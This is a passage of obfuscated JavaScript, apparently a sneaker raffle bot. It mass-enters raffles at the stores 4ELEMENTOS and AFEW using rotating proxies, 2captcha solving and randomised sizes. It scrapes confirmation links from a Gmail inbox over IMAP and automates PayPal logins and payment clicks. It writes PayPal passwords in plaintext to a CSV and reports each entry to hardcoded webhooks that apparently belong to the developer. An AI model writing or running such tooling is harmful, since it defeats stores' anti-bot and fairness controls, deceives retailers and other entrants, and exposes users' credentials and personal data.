        return _0x3a7f4a['Password'] = _0x3785b9['Password'], _0x4b4581['appendFileSync']('../accounts/paypal.csv', '\x0a' + _0x3a7f4a['Email'] + ',' + _0x3a7f4a['Password'] + ',' + _0x3a7f4a['Proxy']), _0x3a7f4a;
    }
    let _0x5e9538 = await _0x27bc14();
    var _0x3eec66 = [];
    console['clear'](), console['log']('How\x20many\x20links\x20would\x20you\x20like\x20to\x20verify\x20on\x20this\x20paypal?');
    let _0x33575d = await _0x1f16f4['get']('Amount'), _0x4ad8eb = _0x33575d['Amount'];
    async function _0x56aa7f() {
        let _0x1a5672 = 0x0;
        var _0x2d669d = new _0x533159({
            'user': _0x1940dd['masterMail'],
            'password': _0x1940dd['masterPassword'],
            'host': 'imap.gmail.com',
            'port': 0x3e1,
            'tls': !![],
            'autotls': 'always'
        });
        function _0x64a212(_0x586143) {
            _0x2d669d['openBox']('INBOX', ![], _0x586143);
        }
        _0x2d669d['once']('ready', function () {
            _0x64a212(function (_0x4cf303, _0x612ef6) {
                console['clear'](), console['log']('Looking\x20For\x20Links');
                if (_0x4cf303)
                    throw _0x4cf303;
                _0x2d669d['seq']['search']([
                    'UNSEEN',
                    [
                        'SUBJECT',
                        'PayPal'
                    ]
                ], function (_0x1d6e92, _0xb4c442) {
                    if (!_0xb4c442 || !_0xb4c442['length'])
                        console['log'](_0x1fc391() + '\x20[' + _0x3d9de8 + ']\x20No\x20mails\x20found'), _0x2d669d['end']();
                    else {
                        _0xb4c442 = _0xb4c442['slice'](0x0, _0x4ad8eb);
                        var _0x5166df = _0x2d669d['seq']['fetch'](_0xb4c442, {
                            'bodies': '',
                            'markSeen': !![]
                        });
                        _0x5166df['on']('message', function (_0x40026c, _0x24a020) {
                            var _0x5d4f85 = '(#' + _0x24a020 + ')\x20';
                            _0x40026c['on']('body', function (_0x424211, _0x4930b9) {
                                _0x6212d5(_0x424211, (_0x315144, _0x2bf060) => {
                                    if (_0x2bf060['subject'] == 'PayPal\x20Konto\x20bestätigen' || _0x2bf060['subject'] == 'Confirm\x20your\x20PayPal\x20account') {
                                        mes = _0x2bf060['text']['split']('[')[0x2];
                                        var _0x5bd3ac = mes['split'](']')[0x0];
                                        _0x3eec66['push'](_0x5bd3ac);
                                    }
                                });
                            }), _0x40026c['once']('end', function () {
                                _0x1a5672++;
                            });
                        }), _0x5166df['once']('error', function (_0x278ae9) {
                            console['log']('Fetch\x20error:\x20' + _0x278ae9);
                        }), _0x5166df['once']('end', function () {
                            _0x2d669d['end']();
                        });
                    }
                });
            });
        }), _0x2d669d['once']('error', function (_0x59e934) {
            console['log'](_0x4f1d86['red'](_0x59e934['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox');
        }), _0x2d669d['once']('end', async function () {
        }), _0x2d669d['connect']();
    }
    try {
        _0x56aa7f(), await _0xf09eb2(0xfa0), console['log']('Found\x20' + _0x3eec66['length'] + '\x20Links\x20in\x20Mailbox');
    } catch {
        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..'), await _0xf09eb2(0xfa0);
    }
    var _0x5ae311;
    _0x3e9ae7('' + _0x3d9de8);
    var _0x5c7f01 = _0x5e9538['Proxy']['split'](':'), _0x32c3a9;
    try {
        _0x32c3a9 = await _0x43efe1['launch']({
            'userDataDir': 'sessions/' + _0x5e9538['Email'],
            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
            'headless': ![],
            'args': [
                '--proxy-server=' + _0x5c7f01[0x0] + ':' + _0x5c7f01[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
    } catch {
        _0x32c3a9 = await _0x43efe1['launch']({
            'userDataDir': 'sessions/' + _0x5e9538['Email'],
            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
            'headless': ![],
            'args': [
                '--proxy-server=' + _0x5c7f01[0x0] + ':' + _0x5c7f01[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
    }
    try {
        console['log'](_0x1fc391() + '\x20[' + _0x3d9de8 + ']\x20Getting\x20Session');
        const _0x162a15 = await _0x32c3a9['newPage']();
        await _0x162a15['authenticate']({
            'username': '' + _0x5c7f01[0x2],
            'password': '' + _0x5c7f01[0x3]
        }), await _0x162a15['setViewport']({
            'width': 0x230,
            'height': 0x2d0
        }), await _0x162a15['goto']('https://www.paypal.com/signin');
        try {
            console['log'](_0x1fc391() + '\x20[' + _0x3d9de8 + ']\x20Logging\x20in\x20to\x20your\x20Paypal\x20account..'), await _0x162a15['waitForSelector']('#email');
            let _0x529fad = await _0x162a15['$eval']('#email', _0x44ae29 => _0x44ae29['getAttribute']('value'));
            if (_0x529fad == '') {
                await _0x162a15['type']('#email', _0x5e9538['Email']), await _0xf09eb2(0x1d3);
                let _0x2f8c80 = await _0x162a15['$']('#splitPassword');
                _0x2f8c80 && (await _0x162a15['click']('#btnNext'), await _0xf09eb2(0xa28)), await _0x162a15['type']('#password', _0x5e9538['Password']), await _0xf09eb2(0x35c), await _0x162a15['click']('#btnLogin');
            } else
                await _0x162a15['type']('#password', _0x5e9538['Password']), await _0xf09eb2(0x35c), await _0x162a15['click']('#btnLogin');
            await _0x162a15['waitForSelector']('#reactContainer__balance', { 'timeout': 0x493e0 }), console['log'](_0x1fc391() + '\x20[' + _0x3d9de8 + ']\x20Successfully\x20logged\x20in'), await _0xf09eb2(0x2710);
        } catch (_0x2d65d8) {
            throw new Error('Login\x20session\x20expired\x20' + _0x2d65d8);
        }
        for (var _0x2c782a = 0x0; _0x2c782a < _0x3eec66['length']; _0x2c782a++) {
            console['log'](_0x1fc391() + '\x20[' + _0x3d9de8 + ']\x20Task\x20' + (_0x2c782a + 0x1) + '\x20:\x20Starting\x20Verification'), _0x3e9ae7(_0x3d9de8 + '\x20Task\x20' + (_0x2c782a + 0x1) + '\x20/\x20' + _0x3eec66['length']);
            const _0xae93db = await _0x32c3a9['newPage']();
            await _0xae93db['goto']('' + _0x3eec66[_0x2c782a], { 'waitUntil': 'networkidle2' }), await _0xf09eb2(0xbb8);
            try {
                const _0x1c5073 = await _0xae93db['$']('#challenge-heading');
                _0x1c5073 && (console['log'](_0x1fc391() + '\x20[' + _0x3d9de8 + ']\x20Task\x20' + (_0x2c782a + 0x1) + '\x20:\x20' + _0x4f1d86['yellow']('2FA\x20Required')), await _0xae93db['waitForSelector']('.CheckoutButton_buttonWrapper_2VloF', { 'timeout': 0x493e0 }));
                await _0xf09eb2(0x9c40), await _0xae93db['waitForSelector']('#payment-submit-btn'), await _0xae93db['$eval']('#payment-submit-btn', _0x17898d => _0x17898d['click']()), await _0xae93db['click']('#payment-submit-btn');
                try {
                    await _0xae93db['waitForSelector']('img[alt=\x22AFEW\x20STORE\x22]'), await _0xf09eb2(0x5dc), console['log'](_0x4f1d86['green'](_0x1fc391() + '\x20[' + _0x3d9de8 + ']\x20Task\x20' + (_0x2c782a + 0x1) + '\x20:\x20Link\x20Verified'));
                } catch (_0x27701b) {
                    _0x548e92 = 'yes';
                    throw new Error('Payment\x20Rejected:\x20' + _0x27701b['message']);
                } finally {
                    if (_0x548e92 == 'yes' && _0x51bba2 != 0x2) {
                        console['log'](_0x4f1d86['red'](_0x1fc391() + '\x20[' + _0x3d9de8['name'] + ']\x20Task\x20' + (_0x2c782a + 0x1) + '\x20:\x20Retrying\x20(' + _0x51bba2 + '\x20/\x205)')), _0x2c782a = _0x2c782a - 0x1, _0x51bba2 = _0x51bba2 + 0x1;
                        continue;
                    }
                    _0x548e92 == 'yes' && _0x51bba2 >= 0x2 && (_0x3f94a0(csv[_0x2c782a], _0x3d9de8), _0x548e92 = 'no', _0x51bba2 = 0x0), await _0xae93db['close'](), await _0xf09eb2(0x4650);
                }
            } catch (_0x14f5cd) {
                console['log'](_0x4f1d86['red'](_0x1fc391() + '\x20[' + _0x3d9de8 + ']\x20Task\x20' + (_0x2c782a + 0x1) + '\x20:\x20' + _0x14f5cd));
            }
        }
    } catch (_0x4d2c36) {
        console['log'](_0x4f1d86['red']('' + _0x4d2c36));
    } finally {
        await _0x32c3a9['close']();
    }
}
const _0xa96df6 = [
    {
        'name': '4ELEMENTOS',
        'modules': [
            {
                'name': '4ELEMENTOS\x20Raffle\x20Entries',
                'store': '4ELEMENTOS',
                'logo': 'https://cdn.lovesavingsgroup.com/logos/4elementos.jpg',
                'function': async function (_0x361561, _0xf12e64, _0x177e52) {
                    _0x43efe1['use'](_0x2180a5()), _0x43efe1['use'](_0x46c0dc({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x1940dd['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x6dc8bc = 0x0; _0x6dc8bc < _0xf12e64['length']; _0x6dc8bc++) {
                        if (_0x86579f != 'yes')
                            var _0x86579f = '', _0x2cbe0b = 0x0;
                        var _0x139eee;
                        try {
                            await _0xf6702b(_0xf12e64, _0x6dc8bc);
                        } catch {
                            _0x86579f = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        _0x3e9ae7(_0x361561['name'] + '\x20Task\x20' + (_0x6dc8bc + 0x1) + '\x20/\x20' + _0xf12e64['length'] + '\x20||\x20File:\x20' + _0x5237bc + '\x20Proxies:\x20' + _0x3c7bd9);
                        var _0x4bed92 = [
                            '40',
                            '40,5',
                            '41',
                            '42',
                            '42,5',
                            '43',
                            '44',
                            '45',
                            '45,5',
                            '46',
                            '47',
                            '47,5',
                            '48'
                        ], _0x5d3160 = Math['round'](Math['random']() * (_0x4bed92['length'] - 0x1));
                        _0xf12e64[_0x6dc8bc]['Size'] == 'RANDOM' && (_0xf12e64[_0x6dc8bc]['Size'] = _0x4bed92[_0x5d3160]);
                        var _0x167014 = Math['round'](Math['random']() * (_0x177e52['length'] - 0x1)), _0x3baa7e = _0x177e52[_0x167014]['split'](':'), _0x49083d;
                        try {
                            _0x49083d = await _0x43efe1['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x3baa7e[0x0] + ':' + _0x3baa7e[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x49083d = await _0x43efe1['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x3baa7e[0x0] + ':' + _0x3baa7e[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            console['log'](_0x1fc391() + '\x20[' + _0x361561['name'] + ']\x20Task\x20' + (_0x6dc8bc + 0x1) + '\x20:\x20Getting\x20Session');
                            const _0xba727b = await _0x49083d['newPage']();
                            await _0xba727b['authenticate']({
                                'username': '' + _0x3baa7e[0x2],
                                'password': '' + _0x3baa7e[0x3]
                            }), await _0xba727b['setRequestInterception'](!![]), _0xba727b['on']('request', _0x34229c => {
                                _0x34229c['resourceType']() === 'image' || _0x34229c['resourceType']() === 'font' || _0x34229c['resourceType']() === 'media' ? _0x34229c['abort']() : _0x34229c['continue']();
                            }), await _0xba727b['goto'](_0xf12e64[_0x6dc8bc]['Url'], { 'waitUntil': 'networkidle2' }), console['log'](_0x1fc391() + '\x20[' + _0x361561['name'] + ']\x20Task\x20' + (_0x6dc8bc + 0x1) + '\x20:\x20Starting\x20Entry'), await _0xba727b['waitForSelector']('#accept-all-gdpr'), await _0xba727b['click']('#accept-all-gdpr'), await _0xba727b['waitForSelector']('#raffles-product'), await _0xf09eb2(0x3e8), await _0xba727b['$eval']('#raffles-product', _0xe7467d => _0xe7467d['click']()), await _0xf09eb2(0x1388), await _0xba727b['waitForSelector']('.fancybox-inner\x20>\x20iframe');
                            var _0x13d4ab = await _0xba727b['$']('.fancybox-inner\x20>\x20iframe'), _0x576737 = await _0x13d4ab['contentFrame']();
                            console['log'](_0x1fc391() + '\x20[' + _0x361561['name'] + ']\x20Task\x20' + (_0x6dc8bc + 0x1) + '\x20:\x20Checking\x20Information'), await _0x576737['waitForSelector']('input[name=\x22sm-form-email\x22]'), await _0xf09eb2(0x1f4), await _0x576737['type']('input[name=\x22sm-form-email\x22]', _0xf12e64[_0x6dc8bc]['Email']), await _0xf09eb2(0xc8), await _0x576737['type']('input[name=\x22sm-form-name\x22]', _0xf12e64[_0x6dc8bc]['FirstName'] + '\x20' + _0xf12e64[_0x6dc8bc]['LastName']), await _0xf09eb2(0xc8), await _0x576737['type']('input[name=\x22sm-form-street\x22]', _0xf12e64[_0x6dc8bc]['Address1'] + '\x20' + _0xf12e64[_0x6dc8bc]['HouseNumber'] + '\x20' + _0xf12e64[_0x6dc8bc]['Address2']), await _0xf09eb2(0xc8), await _0x576737['type']('input[name=\x22sm-form-city\x22]', _0xf12e64[_0x6dc8bc]['City']), await _0xf09eb2(0xc8), await _0x576737['type']('input[name=\x22sm-form-province\x22]', _0xf12e64[_0x6dc8bc]['State']), await _0xf09eb2(0xc8), await _0x576737['type']('input[name=\x22sm-form-zip\x22]', _0xf12e64[_0x6dc8bc]['Zip']), await _0xf09eb2(0xc8), await _0x576737['type']('input[name=\x22sm-form-country\x22]', _0xf12e64[_0x6dc8bc]['Country']), await _0xf09eb2(0xc8), await _0x576737['type']('input[name=\x22sm-form-phone\x22]', _0xf12e64[_0x6dc8bc]['Phone']), await _0xf09eb2(0xc8), await _0x576737['type']('input[name=\x22sm-cst.instagram_user\x22]', _0xf12e64[_0x6dc8bc]['Follower']), await _0xf09eb2(0xc8), await _0x576737['type']('input[name=\x22sm-cst.size\x22]', _0xf12e64[_0x6dc8bc]['Size']), await _0xf09eb2(0x1f4), await _0x576737['click']('.icheckbox_simple-custom.icheckbox--CONSENT'), await _0xf09eb2(0x1f4), await _0x576737['click']('.icheckbox_simple-custom'), await _0xf09eb2(0x1f4), console['log'](_0x1fc391() + '\x20[' + _0x361561['name'] + ']\x20Task\x20' + (_0x6dc8bc + 0x1) + '\x20:\x20Sending\x20Request'), await _0x576737['$eval']('form', _0x5447f6 => _0x5447f6['submit']()), console['log'](_0x4f1d86['green'](_0x1fc391() + '\x20[' + _0x361561['name'] + ']\x20Task\x20' + (_0x6dc8bc + 0x1) + '\x20:\x20Raffle\x20Entered!')), _0x86579f = '';
                            var _0x3a30ae = await _0x22cd2f(_0xf12e64[_0x6dc8bc], _0x361561, 'dev', ![]), _0x359847 = await _0x22cd2f(_0xf12e64[_0x6dc8bc], _0x361561, 'pub', ![]);
                            const _0x20e9f7 = {
                                'succesDEVMSG': { 'embeds': [_0x3a30ae] },
                                'succesPUBMSG': { 'embeds': [_0x359847] }
                            };
                            try {
                                _0x1940dd['webhook'] != undefined && _0x1940dd['webhook'] != '' && await _0x58a176(_0x1940dd['webhook'], _0x20e9f7['succesDEVMSG']), await _0xf09eb2(0xc8), await _0x58a176(_0x2faedb, _0x20e9f7['succesDEVMSG']), await _0xf09eb2(0xc8), await _0x58a176(_0x443f6, _0x20e9f7['succesPUBMSG']);
                            } catch (_0xbbc66c) {
                                console['log'](_0x4f1d86['yellow'](_0x1fc391() + '\x20[' + _0x361561['name'] + ']\x20Task\x20' + (_0x6dc8bc + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0xbbc66c));
                            }
                        } catch (_0x6e7cc2) {
                            console['log'](_0x4f1d86['red'](_0x1fc391() + '\x20[' + _0x361561['name'] + ']\x20Task\x20' + (_0x6dc8bc + 0x1) + '\x20:\x20' + _0x6e7cc2)), _0x139eee = '' + _0x6e7cc2;
                            var _0x571997 = await _0x22cd2f(_0xf12e64[_0x6dc8bc], _0x361561, 'dev', !![], _0x139eee), _0x3a30ae = await _0x22cd2f(_0xf12e64[_0x6dc8bc], _0x361561, 'dev', ![]), _0x359847 = await _0x22cd2f(_0xf12e64[_0x6dc8bc], _0x361561, 'pub', ![]);
                            const _0xb2faf5 = {
                                'succesDEVMSG': { 'embeds': [_0x3a30ae] },
                                'succesPUBMSG': { 'embeds': [_0x359847] }
                            };
                            _0xb2faf5['errorDEV'] = { 'embeds': [_0x571997] }, _0x1940dd['webhook'] != undefined && _0x1940dd['webhook'] != '' && await _0x58a176(_0x1940dd['webhook'], _0xb2faf5['errorDEV']), await _0x58a176(_0x45f55a, _0xb2faf5['errorDEV']), _0x6e7cc2 != 'Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.' && (_0x86579f = 'yes');
                        } finally {
                            _0x49083d['close']();
                            if (_0x86579f == 'yes' && _0x2cbe0b != 0x5 && _0x139eee != 'Size\x20Not\x20Found') {
                                console['log'](_0x4f1d86['red'](_0x1fc391() + '\x20[' + _0x361561['name'] + ']\x20Task\x20' + (_0x6dc8bc + 0x1) + '\x20:\x20Retrying\x20(' + _0x2cbe0b + '\x20/\x205)\x20')), _0x6dc8bc = _0x6dc8bc - 0x1, _0x2cbe0b = _0x2cbe0b + 0x1;
                                continue;
                            }
                            _0x86579f == 'yes' && _0x2cbe0b >= 0x5 && (_0x3f94a0(_0xf12e64[_0x6dc8bc], _0x361561), _0x86579f = 'no', _0x2cbe0b = 0x0), console['log'](_0x1fc391() + '\x20[' + _0x361561['name'] + ']\x20Waiting\x20for\x20' + _0x1940dd['delay'] + '\x20ms'), await _0xf09eb2(_0x1940dd['delay']);
                        }
                    }
                }
            },
            {
                'name': '4ELEMENTOS\x20Link\x20Verification',
                'store': '4ELEMENTOS',
                'logo': 'https://cdn.lovesavingsgroup.com/logos/4elementos.jpg',
                'function': async function (_0x43ad44, _0x3ee196) {
                    var _0x4ae63f = [];
                    async function _0x5ab70c() {
                        var _0x18744b = new _0x533159({
                            'user': _0x1940dd['masterMail'],
                            'password': _0x1940dd['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x5473be(_0x46e75e) {
                            _0x18744b['openBox']('INBOX', ![], _0x46e75e);
                        }
                        _0x18744b['once']('ready', function () {
                            _0x5473be(function (_0xf730af, _0x2f99dd) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0xf730af)
                                    throw _0xf730af;
                                _0x18744b['seq']['search'](['UNSEEN'], function (_0x1dfc01, _0xd9608f) {
                                    if (!_0xd9608f || !_0xd9608f['length'])
                                        console['log'](_0x1fc391() + '\x20[' + _0x43ad44['name'] + ']\x20No\x20mails\x20found'), _0x18744b['end']();
                                    else {
                                        var _0x43ebb8 = _0x18744b['seq']['fetch'](_0xd9608f, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x43ebb8['on']('message', function (_0xaa734a, _0x18d56e) {
                                            var _0x450313 = '(#' + _0x18d56e + ')\x20';
                                            _0xaa734a['on']('body', function (_0x2e000e, _0x3027ea) {
                                                _0x6212d5(_0x2e000e, (_0x1fcb43, _0x17ae6b) => {
                                                    if (_0x17ae6b['subject'] == 'Confirm\x20your\x20subscription\x20to\x20the\x20Raffle\x20||\x20Confirma\x20tu\x20suscripción\x20al\x20Raffle') {
                                                        var _0x583114 = _0x17ae6b['html']['split']('\x0a');
                                                        for (var _0x5b42fb = 0x0; _0x5b42fb < _0x583114['length']; _0x5b42fb++) {
                                                            if (_0x583114[_0x5b42fb]['includes']('salesmanago') && _0x583114[_0x5b42fb]['includes']('<td') && _0x583114[_0x5b42fb]['includes']('href')) {
                                                                var _0x49f2fc = _0x583114[_0x5b42fb]['split']('href=\x22'), _0x552298 = _0x49f2fc[0x1]['split']('\x22')[0x0];
                                                                _0x4ae63f['push'](_0x552298);
                                                                break;
                                                            }
                                                        }
                                                    }
                                                });
                                            }), _0xaa734a['once']('end', function () {
                                            });
                                        }), _0x43ebb8['once']('error', function (_0x37e485) {
                                            console['log']('Fetch\x20error:\x20' + _0x37e485);
                                        }), _0x43ebb8['once']('end', function () {
                                            _0x18744b['end']();
                                        });
                                    }
                                });
                            });
                        }), _0x18744b['once']('error', function (_0x44b9b4) {
                            console['log'](_0x4f1d86['red'](_0x44b9b4['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox');
                        }), _0x18744b['once']('end', async function () {
                        }), _0x18744b['connect']();
                    }
                    async function _0x311e9d(_0x2a5911, _0x251e13, _0x59a187) {
                        for (var _0x4a6682 = 0x0; _0x4a6682 < _0x251e13['length']; _0x4a6682++) {
                            async function _0x162ae6(_0x279e76, _0x67ba79, _0x123b9a, _0x1237ac, _0x133142) {
                                var _0x2f9c03, _0x110b4e = {}, _0x1de2ff = [], _0xb8cb59 = {}, _0x5ca8cc = [
                                    '40',
                                    '40,5',
                                    '41',
                                    '42',
                                    '42,5',
                                    '43',
                                    '44',
                                    '45',
                                    '45,5',
                                    '46',
                                    '47',
                                    '47,5',
                                    '48'
                                ], _0x20c1ca = Math['round'](Math['random']() * (_0x5ca8cc['length'] - 0x1));
                                _0x1237ac[_0x279e76]['Size'] == 'RANDOM' && (_0x1237ac[_0x279e76]['Size'] = _0x5ca8cc[_0x20c1ca]);
                                !_0x1237ac && (_0x1237ac = {});
                                if (_0x1940dd['useRandomProxy'] = ![])
                                    var _0x48a43e = _0x133142[_0x279e76]['split'](':');
                                else
                                    var _0x546743 = Math['round'](Math['random']() * (_0x133142['length'] - 0x1)), _0x48a43e = _0x133142[_0x546743]['split'](':');
                                var _0x245f47 = {
                                    'jar': _0x4cd5d1,
                                    'followAllRedirects': !![],
                                    'method': 'POST',
                                    'url': _0x123b9a['url'],
                                    'headers': _0x123b9a['headers'],
                                    'body': JSON['stringify'](_0x110b4e),
                                    'proxy': 'http://' + _0x48a43e[0x2] + ':' + _0x48a43e[0x3] + '@' + _0x48a43e[0x0] + ':' + _0x48a43e[0x1]
                                };
                                return _0x67ba79 != 'ver' && (_0x245f47['url'] = _0x123b9a['url'], _0x245f47['headers'] = _0x123b9a['headers']), _0x67ba79 == 'ver' && (_0x245f47['method'] = 'GET', _0x245f47['url'] = _0x1237ac[_0x279e76]), new Promise(function (_0x456aab, _0x16bbb1) {
                                    callback = async (_0x4bbafc, _0x3c0de3, _0x2287ee) => {
                                        if (!_0x4bbafc && _0x3c0de3['statusCode'] == 0xca || !_0x4bbafc && _0x3c0de3['statusCode'] == 0xc8) {
                                            if (_0x67ba79 != 'ver') {
                                                var _0x50e30f = await _0x22cd2f(_0x1237ac[_0x279e76], _0x123b9a, 'dev', ![]), _0x2b0ae6 = await _0x22cd2f(_0x1237ac[_0x279e76], _0x123b9a, 'pub', ![]);
                                                const _0x50d2ea = {
                                                    'succesDEVMSG': { 'embeds': [_0x50e30f] },
                                                    'succesPUBMSG': { 'embeds': [_0x2b0ae6] }
                                                };
                                                if (_0x1940dd['webhook'] != undefined && _0x1940dd['webhook'] != '')
                                                    try {
                                                        await _0x58a176(_0x1940dd['webhook'], _0x50d2ea['succesDEVMSG']);
                                                    } catch {
                                                    }
                                                await _0xf09eb2(0xc8), await _0x58a176(_0x2faedb, _0x50d2ea['succesDEVMSG']), await _0xf09eb2(0xc8);
                                                try {
                                                    await _0x58a176(_0x443f6, _0x50d2ea['succesPUBMSG']);
                                                } catch {
                                                }
                                                _0x3ed4cd(_0x1237ac[_0x279e76], _0x123b9a);
                                            }
                                            _0x456aab(console['log'](_0x4f1d86['green'](_0x1fc391() + '\x20[' + _0x123b9a['name'] + ']\x20Task\x20' + (_0x279e76 + 0x1) + ':\x20Raffle\x20Entered!')));
                                        } else {
                                            if (_0x67ba79 != 'ver') {
                                                var _0x4d744f = '' + _0x4bbafc, _0x384a49 = await _0x22cd2f(_0x1237ac[_0x279e76], _0x123b9a, 'dev', !![], _0x4d744f), _0x597376 = {};
                                                _0x597376['errorDEV'] = { 'embeds': [_0x384a49] }, _0x3f94a0(_0x1237ac[_0x279e76], _0x123b9a), _0x1940dd['webhook'] != undefined && _0x1940dd['webhook'] != '' && await _0x58a176(_0x1940dd['webhook'], _0x597376['errorDEV']), await _0x58a176(_0x45f55a, _0x597376['errorDEV']);
                                            }
                                            _0x16bbb1(console['log'](_0x4f1d86['red'](_0x1fc391() + '\x20[' + _0x123b9a['name'] + ']\x20Task\x20' + (_0x279e76 + 0x1) + ':\x20' + _0x4bbafc)));
                                        }
                                    };
                                    try {
                                        _0x67ba79 != 'ver' ? console['log'](_0x1fc391() + '\x20[' + _0x123b9a['name'] + ']\x20Task\x20' + (_0x279e76 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x110b4e['data']['attributes']['email']) : console['log'](_0x1fc391() + '\x20[' + _0x123b9a['name'] + ']\x20Task\x20' + (_0x279e76 + 0x1) + ':\x20Fetching\x20Response'), _0x31fe1f(_0x245f47, callback);
                                    } catch (_0x57d05d) {
                                        console['log'](_0x1fc391() + '\x20Task\x20' + (_0x279e76 + 0x1) + ':\x20' + _0x57d05d);
                                    }
                                });
                            }
                            ;
                            try {
                                await _0x162ae6(_0x4a6682, 'ver', _0x2a5911, _0x251e13, _0x59a187), console['log'](_0x1fc391() + '\x20[' + _0x2a5911['name'] + ']\x20Sleeping\x20for\x20' + _0x1940dd['delay'] + '\x20ms'), await _0xf09eb2(_0x1940dd['delay']);
                            } catch (_0x1f1122) {
                            }
                        }
                    }
                    try {
                        _0x5ab70c(), await _0xf09eb2(0xfa0), console['log']('Found\x20' + _0x4ae63f['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..');
                    }
                    await _0x311e9d(_0x43ad44, _0x4ae63f, _0x3ee196);
                }
            }
        ]
    },
    {
        'name': 'AFEW\x20Store',
        'modules': [{
            'name': 'AFEW\x20Raffle\x20Entries',
            'store': 'AFEW',
            'logo': 'https://d19kzigy6tpscu.cloudfront.net/media/CACHE/images/logo_thumbnail/afew_logo_100x100_1647428869.png',
            'function': async function (_0xf30e28, _0x4fa466, _0x2c3252) {
                for (var _0x1156a5 = 0x0; _0x1156a5 < _0x4fa466['length']; _0x1156a5++) {
                    _0x1940dd['AfewDelay'] = _0x1940dd['delay'];
                    var _0x55658f;
                    if (_0x220d2f != 'yes')
                        var _0x220d2f = '', _0x29c4d9 = 0x0;
                    var _0x5dda67 = _0x4fa466[_0x1156a5]['Url'], _0x202a24 = _0x4fa466[_0x1156a5];
                    _0x3e9ae7(_0xf30e28['name'] + '\x20Task\x20' + (_0x1156a5 + 0x1) + '\x20/\x20' + _0x4fa466['length'] + '\x20||\x20File:\x20' + _0x5237bc + '\x20Proxies:\x20' + _0x3c7bd9);
                    try {
                        await _0xf6702b(_0x4fa466, _0x1156a5);
                    } catch {
                        _0x220d2f = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    async function _0x3146e0(_0x2c8cfd) {
                        const _0x4cada4 = _0x4b4581['readFileSync']('../successful-tasks.csv', 'utf8'), _0x37aa00 = _0x57f724['parse'](_0x4cada4, { 'header': !![] })['data'];
                        let _0x122b4a = ![];
                        for (var _0x3fde5d of _0x37aa00) {
                            if (_0x3fde5d['Url'] == _0x2c8cfd['Url'] && _0x3fde5d['Email'] == _0x2c8cfd['Email']) {
                                _0x122b4a = !![];
                                break;
                            }
                        }
                        return _0x122b4a;
                    }
                    if (await _0x3146e0(_0x4fa466[_0x1156a5]) == !![]) {
                        console['log'](_0x1fc391() + '\x20[' + _0xf30e28['name'] + ']\x20Task\x20' + (_0x1156a5 + 0x1) + '\x20:\x20Task\x20Already\x20Entered,\x20Going\x20to\x20Next\x20Task');
                        continue;
                    }
                    var _0x2bb51e = await _0x22cd2f(_0x4fa466[_0x1156a5], _0xf30e28, 'dev', ![]), _0xcb4ef2 = await _0x22cd2f(_0x4fa466[_0x1156a5], _0xf30e28, 'pub', ![]);
                    const _0x5e1932 = {
                        'succesDEVMSG': { 'embeds': [_0x2bb51e] },
                        'succesPUBMSG': { 'embeds': [_0xcb4ef2] }
                    };
                    if (_0x4fa466[_0x1156a5]['Email'] == '' || _0x4fa466[_0x1156a5]['FirstName'] == '' || _0x4fa466[_0x1156a5]['LastName'] == '' || _0x4fa466[_0x1156a5]['Country'] == '' || _0x4fa466[_0x1156a5]['Size'] == '' || _0x4fa466[_0x1156a5]['Address1'] == '' || _0x4fa466[_0x1156a5]['Zip'] == '') {
                        console['log'](_0x1fc391() + '\x20[' + _0xf30e28['name'] + ']\x20Task\x20' + (_0x1156a5 + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    if (_0x1940dd['useRandomProxy'] = ![])
                        var _0x50d871 = _0x2c3252[_0x1156a5]['split'](':');
                    else
                        var _0x493f8b = Math['round'](Math['random']() * (_0x2c3252['length'] - 0x1)), _0x50d871 = _0x2c3252[_0x493f8b]['split'](':');
                    var _0x37d227;
                    try {
                        _0x37d227 = await _0x43efe1['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x50d871[0x0] + ':' + _0x50d871[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    } catch {
                        _0x37d227 = await _0x43efe1['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
